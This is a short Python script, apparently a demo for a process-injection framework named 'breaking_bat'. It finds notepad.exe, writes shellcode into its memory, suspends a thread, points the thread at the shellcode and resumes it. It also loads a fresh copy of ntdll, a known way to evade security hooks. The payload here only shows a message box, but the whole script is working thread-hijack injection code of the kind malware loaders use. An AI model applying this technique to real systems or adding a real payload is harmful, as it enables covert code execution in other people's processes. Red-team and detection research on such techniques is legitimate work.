import breaking_bat as bb
from breaking_bat import RemoteProcessOpenMethod, RemoteProcessMemoryMethod


if __name__ == "__main__":

    print("Script: Inject via hijack remote thread")
    print()

    bb.init_sysapi(ntdll_load_copy=True)
    bb.set_default_options(
        open_method=RemoteProcessOpenMethod.OpenProcess,
        memory_method=RemoteProcessMemoryMethod.AllocateInAddr
    )

    shellcode = bb.shellcode_get_messageboxw();

    pid = bb.process_find("notepad.exe")
    bb.process_open(pid)

    is_x64 = bb.process_is_x64()

    mem_ctx = bb.process_init_memory(pid=pid)
    bb.memory_set_size(ctx=mem_ctx, size=len(shellcode))
    bb.process_create_memory(ctx=mem_ctx)
    bb.process_write_memory(ctx=mem_ctx, data=shellcode)

    bb.process_thread_open()
    bb.process_thread_suspend()
    bb.process_thread_set_execute(new_thread=False, is_x64=is_x64, ep=bb.memory_get_remote_address(ctx=mem_ctx))
    bb.process_thread_resume()

    bb.script_success()
